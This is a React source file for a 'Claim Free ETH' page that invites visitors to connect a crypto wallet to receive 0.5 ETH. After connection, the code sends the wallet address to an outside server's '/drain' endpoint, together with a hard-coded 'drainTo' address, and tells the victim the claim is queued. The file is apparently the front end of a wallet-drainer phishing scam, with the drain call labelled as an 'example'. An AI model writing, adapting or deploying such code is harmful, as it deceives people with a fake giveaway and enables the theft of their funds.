import React, { useState } from "react";
import ReactDOM from "react-dom/client";

// Wagmi + Viem
import { WagmiConfig, createConfig, configureChains, useAccount } from "wagmi";
import { mainnet, sepolia } from "@wagmi/chains";
import { publicProvider } from "viem"; // <-- fixed
import { InjectedConnector } from "wagmi/connectors/injected";
import { WalletConnectConnector } from "wagmi/connectors/walletConnect";

// Web3Modal v2
import { Web3Modal, useWeb3Modal } from "@web3modal/wagmi"; // <-- updated package

/* ---------------------------
   Wagmi Configuration
---------------------------- */
const projectId = "962425907914a3e80a7d8e7288b23f62";

const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);

const config = createConfig({
  autoConnect: true,
  connectors: [
    new InjectedConnector({ chains }),
    new WalletConnectConnector({ chains, options: { projectId } }),
  ],
  publicClient,
});

/* ---------------------------
   App Component
---------------------------- */
const App = () => {
  const [loading, setLoading] = useState(false);
  const [response, setResponse] = useState(null);

  const { open } = useWeb3Modal();
  const { address, isConnected } = useAccount();

  const connectWallet = async () => {
    try {
      setLoading(true);
      setResponse(null);

      // Open Web3Modal to select wallet
      const connection = await open();
      const walletAddress = connection?.accounts?.[0];

      if (!walletAddress) throw new Error("No wallet connected");

      // Example backend request
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          address: walletAddress,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();

      setResponse({
        success: res.ok,
        message: res.ok
          ? "Token claim queued. You will be credited shortly."
          : "Failed to claim token.",
        data,
      });
    } catch (err) {
      console.error(err);
      setResponse({ success: false, message: "Wallet connection failed." });
    } finally {
      setLoading(false);
    }
  };

  return (
    <WagmiConfig config={config}>
      <div className="min-h-screen flex items-center justify-center bg-gray-900 text-white font-sans">
        <div className="bg-gray-800 p-8 rounded-xl shadow-lg w-full max-w-md text-center">
          <h1 className="text-2xl font-bold mb-4">Claim Free ETH</h1>
          <p className="text-gray-400 mb-6">Connect your wallet to claim 0.5 ETH.</p>

          <button
            onClick={connectWallet}
            disabled={loading}
            className={`w-full py-3 rounded-lg font-bold text-white transition-colors ${
              loading ? "bg-gray-600 cursor-not-allowed" : "bg-green-500 hover:bg-green-600"
            }`}
          >
            {loading ? (
              <div className="flex items-center justify-center">
                <svg
                  className="animate-spin h-5 w-5 mr-2 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  />
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v8H4z"
                  />
                </svg>
                Connecting...
              </div>
            ) : isConnected ? "Wallet Connected" : "Connect Wallet"}
          </button>

          {isConnected && (
            <p className="mt-4 text-sm text-gray-400 break-all">Connected: {address}</p>
          )}

          {response && (
            <pre className="mt-4 bg-gray-700 p-4 rounded-lg text-left text-sm overflow-x-auto">
              {JSON.stringify(response, null, 2)}
            </pre>
          )}
        </div>

        {/* Web3Modal */}
        <Web3Modal projectId={projectId} themeMode="dark" enableNetworkSwitch />
      </div>
    </WagmiConfig>
  );
};

/* ---------------------------
   Mount React App
---------------------------- */
ReactDOM.createRoot(document.getElementById("root")).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>
);
